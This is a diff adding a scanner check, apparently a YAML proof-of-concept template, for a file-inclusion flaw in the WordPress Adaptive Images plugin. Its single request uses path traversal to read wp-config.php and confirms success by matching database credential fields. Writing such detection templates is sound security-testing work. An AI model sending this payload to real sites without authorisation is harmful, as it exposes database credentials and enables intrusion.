@@ -1,0 +1,18 @@
+id: wordpress-ext-adaptive-images-lfi
+
+info:
+    name: wordpress-ext-adaptive-images-lfi
+    author: FiveAourThe(https://github.com/FiveAourThe)
+    severity: high
+
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"DB_NAME") && response.body.bcontains(b"DB_USER") && response.body.bcontains(b"DB_PASSWORD") && response.body.bcontains(b"DB_HOST")
+expression: r0()
